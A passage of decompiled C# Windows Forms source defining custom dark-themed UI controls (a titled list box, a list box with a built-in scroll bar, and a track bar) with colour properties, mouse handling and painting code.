					arg_535_0.DrawString(arg_535_1, arg_535_2, arg_535_3, layoutRectangle, new StringFormat
					{
						LineAlignment = StringAlignment.Center,
						Alignment = StringAlignment.Near
					});
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInTitledListBox : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		[AccessedThroughProperty("ListB")]
		private ListBox _ListB;

		private string[] _Items;

		private Color _BaseColour;

		private Color _SelectedColour;

		private Color _ListBaseColour;

		private Color _TextColour;

		private Color _BorderColour;

		private Font _TitleFont;

		private virtual ListBox ListB
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ListB;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				DrawItemEventHandler value2 = new DrawItemEventHandler(this.Drawitem);
				bool flag = this._ListB != null;
				if (flag)
				{
					this._ListB.DrawItem -= value2;
				}
				this._ListB = value;
				flag = (this._ListB != null);
				if (flag)
				{
					this._ListB.DrawItem += value2;
				}
			}
		}

		[Category("Control")]
		public Font TitleFont
		{
			get
			{
				return this._TitleFont;
			}
			set
			{
				this._TitleFont = value;
			}
		}

		[Category("Control")]
		public string[] Items
		{
			get
			{
				return this._Items;
			}
			set
			{
				this._Items = value;
				this.ListB.Items.Clear();
				this.ListB.Items.AddRange(value);
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color SelectedColour
		{
			get
			{
				return this._SelectedColour;
			}
			set
			{
				this._SelectedColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ListBaseColour
		{
			get
			{
				return this._ListBaseColour;
			}
			set
			{
				this._ListBaseColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		public string SelectedItem
		{
			get
			{
				return Conversions.ToString(this.ListB.SelectedItem);
			}
		}

		public int SelectedIndex
		{
			get
			{
				return this.ListB.SelectedIndex;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInTitledListBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInTitledListBox.__ENCList.Count == LogInTitledListBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInTitledListBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInTitledListBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInTitledListBox.__ENCList[num] = LogInTitledListBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInTitledListBox.__ENCList.RemoveRange(num, LogInTitledListBox.__ENCList.Count - num);
						LogInTitledListBox.__ENCList.Capacity = LogInTitledListBox.__ENCList.Count;
					}
					LogInTitledListBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public void Clear()
		{
			this.ListB.Items.Clear();
		}

		public void ClearSelected()
		{
			checked
			{
				int num = this.ListB.SelectedItems.Count - 1;
				while (true)
				{
					int arg_46_0 = num;
					int num2 = 0;
					if (arg_46_0 < num2)
					{
						break;
					}
					this.ListB.Items.Remove(RuntimeHelpers.GetObjectValue(this.ListB.SelectedItems[num]));
					num += -1;
				}
			}
		}

		protected override void OnCreateControl()
		{
			base.OnCreateControl();
			bool flag = !this.Controls.Contains(this.ListB);
			if (flag)
			{
				this.Controls.Add(this.ListB);
			}
		}

		public void AddRange(object[] items)
		{
			this.ListB.Items.Remove("");
			this.ListB.Items.AddRange(items);
		}

		public void AddItem(object item)
		{
			this.ListB.Items.Remove("");
			this.ListB.Items.Add(RuntimeHelpers.GetObjectValue(item));
		}

		public void Drawitem(object sender, DrawItemEventArgs e)
		{
			bool flag = e.Index < 0;
			checked
			{
				if (!flag)
				{
					e.DrawBackground();
					e.DrawFocusRectangle();
					Graphics graphics = e.Graphics;
					graphics.SmoothingMode = SmoothingMode.HighQuality;
					graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
					graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
					graphics.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
					flag = (Strings.InStr(e.State.ToString(), "Selected,", CompareMethod.Binary) > 0);
					if (flag)
					{
						Graphics arg_C3_0 = graphics;
						Brush arg_C3_1 = new SolidBrush(this._SelectedColour);
						int arg_BB_1 = e.Bounds.X;
						int arg_BB_2 = e.Bounds.Y;
						int arg_BB_3 = e.Bounds.Width;
						Rectangle bounds = e.Bounds;
						Rectangle bounds2 = new Rectangle(arg_BB_1, arg_BB_2, arg_BB_3, bounds.Height - 1);
						arg_C3_0.FillRectangle(arg_C3_1, bounds2);
						Graphics arg_12B_0 = graphics;
						string arg_12B_1 = " " + this.ListB.Items[e.Index].ToString();
						Font arg_12B_2 = new Font("Segoe UI", 9f, FontStyle.Bold);
						Brush arg_12B_3 = new SolidBrush(this._TextColour);
						bounds = e.Bounds;
						float arg_12B_4 = (float)bounds.X;
						bounds2 = e.Bounds;
						arg_12B_0.DrawString(arg_12B_1, arg_12B_2, arg_12B_3, arg_12B_4, (float)(bounds2.Y + 2));
					}
					else
					{
						Graphics arg_186_0 = graphics;
						Brush arg_186_1 = new SolidBrush(this._ListBaseColour);
						Rectangle bounds2 = e.Bounds;
						Rectangle bounds = new Rectangle(bounds2.X, e.Bounds.Y, e.Bounds.Width, e.Bounds.Height);
						arg_186_0.FillRectangle(arg_186_1, bounds);
						Graphics arg_1ED_0 = graphics;
						string arg_1ED_1 = " " + this.ListB.Items[e.Index].ToString();
						Font arg_1ED_2 = new Font("Segoe UI", 8f);
						Brush arg_1ED_3 = new SolidBrush(this._TextColour);
						bounds = e.Bounds;
						float arg_1ED_4 = (float)bounds.X;
						bounds2 = e.Bounds;
						arg_1ED_0.DrawString(arg_1ED_1, arg_1ED_2, arg_1ED_3, arg_1ED_4, (float)(bounds2.Y + 2));
					}
					graphics.Dispose();
				}
			}
		}

		public LogInTitledListBox()
		{
			LogInTitledListBox.__ENCAddToList(this);
			this.ListB = new ListBox();
			this._Items = new string[]
			{
				""
			};
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._SelectedColour = Color.FromArgb(55, 55, 55);
			this._ListBaseColour = Color.FromArgb(47, 47, 47);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._TitleFont = new Font("Segeo UI", 10f, FontStyle.Bold);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.ListB.DrawMode = DrawMode.OwnerDrawFixed;
			this.ListB.ScrollAlwaysVisible = false;
			this.ListB.HorizontalScrollbar = false;
			this.ListB.BorderStyle = BorderStyle.None;
			this.ListB.BackColor = this.BaseColour;
			Control arg_116_0 = this.ListB;
			Point location = new Point(3, 28);
			arg_116_0.Location = location;
			this.ListB.Font = new Font("Segoe UI", 8f);
			this.ListB.ItemHeight = 20;
			this.ListB.Items.Clear();
			this.ListB.IntegralHeight = false;
			Size size = new Size(130, 100);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.Clear(this.BackColor);
			Control arg_66_0 = this.ListB;
			checked
			{
				Size size = new Size(this.Width - 6, this.Height - 30);
				arg_66_0.Size = size;
				graphics2.FillRectangle(new SolidBrush(this.BaseColour), rect);
				Graphics arg_AA_0 = graphics2;
				Pen arg_AA_1 = new Pen(this._BorderColour, 3f);
				Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height - 1);
				arg_AA_0.DrawRectangle(arg_AA_1, rectangle);
				Graphics arg_E2_0 = graphics2;
				Pen arg_E2_1 = new Pen(this._BorderColour, 2f);
				Point point = new Point(0, 27);
				Point arg_E2_2 = point;
				Point pt = new Point(this.Width - 1, 27);
				arg_E2_0.DrawLine(arg_E2_1, arg_E2_2, pt);
				Graphics arg_136_0 = graphics2;
				string arg_136_1 = this.Text;
				Font arg_136_2 = this._TitleFont;
				Brush arg_136_3 = new SolidBrush(this._TextColour);
				rectangle = new Rectangle(2, 5, this.Width - 5, 20);
				arg_136_0.DrawString(arg_136_1, arg_136_2, arg_136_3, rectangle, new StringFormat
				{
					Alignment = StringAlignment.Center,
					LineAlignment = StringAlignment.Center
				});
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInTitledListBoxWBuiltInScrollBar : Control
	{
		public class LogInListBoxItem
		{
			[DebuggerBrowsable(DebuggerBrowsableState.Never), CompilerGenerated]
			private string _Text;

			public string Text
			{
				[DebuggerNonUserCode]
				get
				{
					return this._Text;
				}
				[DebuggerNonUserCode]
				set
				{
					this._Text = value;
				}
			}

			[DebuggerNonUserCode]
			public LogInListBoxItem()
			{
			}

			public override string ToString()
			{
				return this.Text;
			}
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private List<LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem> _Items;

		private readonly List<LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem> _SelectedItems;

		private bool _MultiSelect;

		private int ItemHeight;

		private readonly LogInVerticalScrollBar VerticalScrollbar;

		private Color _BaseColour;

		private Color _SelectedItemColour;

		private Color _NonSelectedItemColour;

		private Color _TitleAreaColour;

		private Color _BorderColour;

		private Color _TextColour;

		private int _SelectedHeight;

		[Category("Colours")]
		public Color TitleAreaColour
		{
			get
			{
				return this._TitleAreaColour;
			}
			set
			{
				this._TitleAreaColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Control")]
		public int SelectedHeight
		{
			get
			{
				return this._SelectedHeight;
			}
			set
			{
				bool flag = value < 1;
				if (flag)
				{
					this._SelectedHeight = this.Height;
				}
				else
				{
					this._SelectedHeight = value;
				}
				this.InvalidateScroll();
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color SelectedItemColour
		{
			get
			{
				return this._SelectedItemColour;
			}
			set
			{
				this._SelectedItemColour = value;
			}
		}

		[Category("Colours")]
		public Color NonSelectedItemColour
		{
			get
			{
				return this._NonSelectedItemColour;
			}
			set
			{
				this._NonSelectedItemColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		public LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem[] Items
		{
			get
			{
				return this._Items.ToArray();
			}
			set
			{
				this._Items = new List<LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem>(value);
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		public LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem[] SelectedItems
		{
			get
			{
				return this._SelectedItems.ToArray();
			}
		}

		public bool MultiSelect
		{
			get
			{
				return this._MultiSelect;
			}
			set
			{
				this._MultiSelect = value;
				bool flag = this._SelectedItems.Count > 1;
				if (flag)
				{
					this._SelectedItems.RemoveRange(1, checked(this._SelectedItems.Count - 1));
				}
				this.Invalidate();
			}
		}

		public override Font Font
		{
			get
			{
				return base.Font;
			}
			set
			{
				this.ItemHeight = checked((int)Math.Round((double)Graphics.FromHwnd(this.Handle).MeasureString("@", this.Font).Height));
				bool flag = this.VerticalScrollbar != null;
				if (flag)
				{
					this.VerticalScrollbar._SmallChange = 1;
					this.VerticalScrollbar._LargeChange = 1;
				}
				base.Font = value;
				this.InvalidateLayout();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInTitledListBoxWBuiltInScrollBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInTitledListBoxWBuiltInScrollBar.__ENCList.Count == LogInTitledListBoxWBuiltInScrollBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInTitledListBoxWBuiltInScrollBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInTitledListBoxWBuiltInScrollBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInTitledListBoxWBuiltInScrollBar.__ENCList[num] = LogInTitledListBoxWBuiltInScrollBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInTitledListBoxWBuiltInScrollBar.__ENCList.RemoveRange(num, LogInTitledListBoxWBuiltInScrollBar.__ENCList.Count - num);
						LogInTitledListBoxWBuiltInScrollBar.__ENCList.Capacity = LogInTitledListBoxWBuiltInScrollBar.__ENCList.Count;
					}
					LogInTitledListBoxWBuiltInScrollBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		private void HandleScroll(object sender)
		{
			this.Invalidate();
		}

		private void InvalidateScroll()
		{
			Debug.Print(Conversions.ToString(this.Height));
			checked
			{
				bool flag = (double)((int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight))) < (double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight;
				if (flag)
				{
					this.VerticalScrollbar._Maximum = (int)Math.Round(Math.Ceiling((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight));
				}
				else
				{
					flag = ((int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight)) == 0);
					if (flag)
					{
						this.VerticalScrollbar._Maximum = 1;
					}
					else
					{
						this.VerticalScrollbar._Maximum = (int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight));
					}
				}
				this.Invalidate();
			}
		}

		private void InvalidateLayout()
		{
			Control arg_25_0 = this.VerticalScrollbar;
			checked
			{
				Point location = new Point(this.Width - this.VerticalScrollbar.Width - 2, 2);
				arg_25_0.Location = location;
				Control arg_44_0 = this.VerticalScrollbar;
				Size size = new Size(18, this.Height - 4);
				arg_44_0.Size = size;
				this.Invalidate();
			}
		}

		public void AddItem(string Items)
		{
			LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem logInListBoxItem = new LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem();
			logInListBoxItem.Text = Items;
			this._Items.Add(logInListBoxItem);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void AddItems(string[] Items)
		{
			checked
			{
				for (int i = 0; i < Items.Length; i++)
				{
					string text = Items[i];
					LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem logInListBoxItem = new LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem();
					logInListBoxItem.Text = text;
					this._Items.Add(logInListBoxItem);
				}
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		public void RemoveItemAt(int index)
		{
			this._Items.RemoveAt(index);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void RemoveItem(LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem item)
		{
			this._Items.Remove(item);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void RemoveItems(LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem[] items)
		{
			checked
			{
				for (int i = 0; i < items.Length; i++)
				{
					LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem item = items[i];
					this._Items.Remove(item);
				}
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			this._SelectedHeight = this.Height;
			this.InvalidateScroll();
			this.InvalidateLayout();
			base.OnSizeChanged(e);
		}

		private void Vertical_MouseDown(object sender, MouseEventArgs e)
		{
			this.Focus();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			this.Focus();
			bool flag = e.Button == MouseButtons.Left;
			checked
			{
				if (flag)
				{
					int num = this.VerticalScrollbar.Value * (this.VerticalScrollbar.Maximum + (this.Height - this.ItemHeight));
					int num2 = (e.Y + num) / this.ItemHeight;
					flag = (num2 > this._Items.Count - 1);
					if (flag)
					{
						num2 = -1;
					}
					flag = (num2 != -1);
					if (flag)
					{
						bool flag2 = Control.ModifierKeys == Keys.Control && this._MultiSelect;
						if (flag2)
						{
							bool flag3 = this._SelectedItems.Contains(this._Items[num2]);
							if (flag3)
							{
								this._SelectedItems.Remove(this._Items[num2]);
							}
							else
							{
								this._SelectedItems.Add(this._Items[num2]);
							}
						}
						else
						{
							this._SelectedItems.Clear();
							this._SelectedItems.Add(this._Items[num2]);
						}
						Debug.Print(this._SelectedItems[0].Text);
					}
					this.Invalidate();
				}
				base.OnMouseDown(e);
			}
		}

		protected override void OnMouseWheel(MouseEventArgs e)
		{
			checked
			{
				int num = 0 - e.Delta * SystemInformation.MouseWheelScrollLines / 120 * 1;
				int value = Math.Max(Math.Min(this.VerticalScrollbar.Value + num, this.VerticalScrollbar.Maximum), this.VerticalScrollbar.Minimum);
				this.VerticalScrollbar.Value = value;
				base.OnMouseWheel(e);
			}
		}

		public LogInTitledListBoxWBuiltInScrollBar()
		{
			LogInTitledListBoxWBuiltInScrollBar.__ENCAddToList(this);
			this._Items = new List<LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem>();
			this._SelectedItems = new List<LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem>();
			this._MultiSelect = true;
			this.ItemHeight = 24;
			this._BaseColour = Color.FromArgb(55, 55, 55);
			this._SelectedItemColour = Color.FromArgb(50, 50, 50);
			this._NonSelectedItemColour = Color.FromArgb(47, 47, 47);
			this._TitleAreaColour = Color.FromArgb(42, 42, 42);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._SelectedHeight = 1;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.VerticalScrollbar = new LogInVerticalScrollBar();
			this.VerticalScrollbar.SmallChange = 1;
			this.VerticalScrollbar.LargeChange = 1;
			this.VerticalScrollbar.Scroll += new LogInVerticalScrollBar.ScrollEventHandler(this.HandleScroll);
			this.VerticalScrollbar.MouseDown += new MouseEventHandler(this.Vertical_MouseDown);
			this.Controls.Add(this.VerticalScrollbar);
			this.InvalidateLayout();
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this._BaseColour);
			checked
			{
				int num = this.VerticalScrollbar.Value * (this.VerticalScrollbar.Maximum + (this.Height - this.ItemHeight));
				bool flag = num == 0;
				int num2;
				if (flag)
				{
					num2 = 0;
				}
				else
				{
					num2 = num / this.ItemHeight / this.VerticalScrollbar.Maximum;
				}
				int num3 = Math.Min(num2 + this.Height / this.ItemHeight, this._Items.Count - 1);
				int arg_B4_0 = num2;
				int num4 = this._Items.Count - 1;
				int num5 = arg_B4_0;
				Rectangle rectangle;
				while (true)
				{
					int arg_237_0 = num5;
					int num6 = num4;
					if (arg_237_0 > num6)
					{
						break;
					}
					LogInTitledListBoxWBuiltInScrollBar.LogInListBoxItem logInListBoxItem = this.Items[num5];
					int num7 = this.ItemHeight + num5 * this.ItemHeight + 1 - num + (int)Math.Round(unchecked((double)this.ItemHeight / 2.0 - 8.0));
					flag = this._SelectedItems.Contains(logInListBoxItem);
					if (flag)
					{
						Graphics arg_14C_0 = graphics2;
						Brush arg_14C_1 = new SolidBrush(this._SelectedItemColour);
						rectangle = new Rectangle(0, this.ItemHeight + num5 * this.ItemHeight + 1 - num, this.Width - 19, this.ItemHeight - 1);
						arg_14C_0.FillRectangle(arg_14C_1, rectangle);
					}
					else
					{
						Graphics arg_192_0 = graphics2;
						Brush arg_192_1 = new SolidBrush(this._NonSelectedItemColour);
						rectangle = new Rectangle(0, this.ItemHeight + num5 * this.ItemHeight + 1 - num, this.Width - 19, this.ItemHeight - 1);
						arg_192_0.FillRectangle(arg_192_1, rectangle);
					}
					graphics2.DrawLine(new Pen(this._BorderColour), 0, this.ItemHeight + num5 * this.ItemHeight + 1 - num + this.ItemHeight - 1, this.Width - 18, this.ItemHeight + num5 * this.ItemHeight + 1 - num + this.ItemHeight - 1);
					graphics2.DrawString(logInListBoxItem.Text, new Font("Segoe UI", 8f), new SolidBrush(this._TextColour), 9f, (float)num7);
					graphics2.ResetClip();
					num5++;
				}
				Graphics arg_261_0 = graphics2;
				Brush arg_261_1 = new SolidBrush(this._TitleAreaColour);
				rectangle = new Rectangle(0, 0, this.Width, this.ItemHeight);
				arg_261_0.FillRectangle(arg_261_1, rectangle);
				graphics2.DrawRectangle(new Pen(Color.FromArgb(35, 35, 35)), 1, 1, this.Width - 3, this.ItemHeight - 2);
				Graphics arg_2EE_0 = graphics2;
				string arg_2EE_1 = this.Text;
				Font arg_2EE_2 = new Font("Segoe UI", 10f, FontStyle.Bold);
				Brush arg_2EE_3 = new SolidBrush(this._TextColour);
				rectangle = new Rectangle(0, 0, this.Width, this.ItemHeight + 2);
				arg_2EE_0.DrawString(arg_2EE_1, arg_2EE_2, arg_2EE_3, rectangle, new StringFormat
				{
					Alignment = StringAlignment.Center,
					LineAlignment = StringAlignment.Center
				});
				graphics2.DrawRectangle(new Pen(Color.FromArgb(35, 35, 35), 2f), 1, 0, this.Width - 2, this.Height - 1);
				graphics2.DrawLine(new Pen(this._BorderColour), 0, this.ItemHeight, this.Width, this.ItemHeight);
				graphics2.DrawLine(new Pen(this._BorderColour, 2f), this.VerticalScrollbar.Location.X - 1, 0, this.VerticalScrollbar.Location.X - 1, this.Height);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInTrackBar : Control
	{
		public delegate void ValueChangedEventHandler();

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private int _Maximum;

		private int _Value;

		private bool CaptureMovement;

		private Rectangle Bar;

		private Size Track;

		private Color _TextColour;

		private Color _BorderColour;

		private Color _BarBaseColour;

		private Color _StripColour;

		private Color _StripAmountColour;

		private LogInTrackBar.ValueChangedEventHandler ValueChangedEvent;

		public event LogInTrackBar.ValueChangedEventHandler ValueChanged
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.ValueChangedEvent = (LogInTrackBar.ValueChangedEventHandler)Delegate.Combine(this.ValueChangedEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.ValueChangedEvent = (LogInTrackBar.ValueChangedEventHandler)Delegate.Remove(this.ValueChangedEvent, value);
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color BarBaseColour
		{
			get
			{
				return this._BarBaseColour;
			}
			set
			{
				this._BarBaseColour = value;
			}
		}

		[Category("Colours")]
		public Color StripColour
		{
			get
			{
				return this._StripColour;
			}
			set
			{
				this._StripColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color StripAmountColour
		{
			get
			{
				return this._StripAmountColour;
			}
			set
			{
				this._StripAmountColour = value;
			}
		}

		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value > 0;
				if (flag)
				{
					this._Maximum = value;
				}
				flag = (value < this._Value);
				if (flag)
				{
					this._Value = value;
				}
				this.Invalidate();
			}
		}

		public int Value
		{
			get
			{
				return this._Value;
			}
			set
			{
				bool flag = value == this._Value;
				if (!flag)
				{
					flag = (value < 0);
					if (flag)
					{
						this._Value = 0;
					}
					else
					{
						flag = (value > this._Maximum);
						if (flag)
						{
							this._Value = this._Maximum;
						}
						else
						{
							this._Value = value;
						}
					}
					this.Invalidate();
					LogInTrackBar.ValueChangedEventHandler valueChangedEvent = this.ValueChangedEvent;
					flag = (valueChangedEvent != null);
					if (flag)
					{
						valueChangedEvent();
					}
				}
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInTrackBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInTrackBar.__ENCList.Count == LogInTrackBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInTrackBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInTrackBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInTrackBar.__ENCList[num] = LogInTrackBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInTrackBar.__ENCList.RemoveRange(num, LogInTrackBar.__ENCList.Count - num);
						LogInTrackBar.__ENCList.Capacity = LogInTrackBar.__ENCList.Count;
					}
					LogInTrackBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			Point point = new Point(e.Location.X, e.Location.Y);
			Point arg_3D_1 = point;
			Size size = new Size(1, 1);
			Rectangle rect = new Rectangle(arg_3D_1, size);
			checked
			{
				Rectangle rectangle = new Rectangle(10, 10, this.Width - 21, this.Height - 21);
				point = new Point(rectangle.X + (int)Math.Round(unchecked((double)rectangle.Width * ((double)this.Value / (double)this.Maximum))) - (int)Math.Round(unchecked((double)this.Track.Width / 2.0 - 1.0)), 0);
				Point arg_D6_1 = point;
				size = new Size(this.Track.Width, this.Height);
				Rectangle rectangle2 = new Rectangle(arg_D6_1, size);
				Rectangle rectangle3 = rectangle2;
				bool flag = rectangle3.IntersectsWith(rect);
				if (flag)
				{
					this.CaptureMovement = true;
				}
			}
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.CaptureMovement = false;
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			base.OnMouseMove(e);
			bool captureMovement = this.CaptureMovement;
			checked
			{
				if (captureMovement)
				{
					Point point = new Point(e.X, e.Y);
					Rectangle rectangle = new Rectangle(10, 10, this.Width - 21, this.Height - 21);
					this.Value = (int)Math.Round(unchecked((double)this.Maximum * ((double)(checked(point.X - rectangle.X)) / (double)rectangle.Width)));
				}
			}
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.CaptureMovement = false;
		}

		public LogInTrackBar()
		{
			LogInTrackBar.__ENCAddToList(this);
			this._Maximum = 10;
			this._Value = 0;
			this.CaptureMovement = false;
			this.Bar = checked(new Rectangle(0, 10, this.Width - 21, this.Height - 21));
			this.Track = new Size(25, 14);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._BarBaseColour = Color.FromArgb(47, 47, 47);
			this._StripColour = Color.FromArgb(42, 42, 42);
			this._StripAmountColour = Color.FromArgb(23, 119, 151);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.FromArgb(54, 54, 54);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
